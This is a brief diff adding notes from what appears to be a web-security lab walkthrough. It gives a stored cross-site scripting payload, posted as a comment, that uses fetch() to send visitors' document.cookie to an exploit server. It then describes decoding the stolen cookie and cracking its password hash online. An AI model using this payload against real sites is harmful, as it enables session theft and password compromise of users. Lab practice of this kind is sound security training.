@@ -1,0 +1,6 @@
+first steal cookie by commenting this payload:
+<script>fetch("https://exploit-0a8800750328ab3a80d51b6301320013.exploit-server.net/exploit?c="+document.cookie, {"mode":"no-cors"});</script>
+
+we will receive cookie on the exploit server 
+
+once we have the cookie we decode base64 and put the hash on crackstation and then we have the password
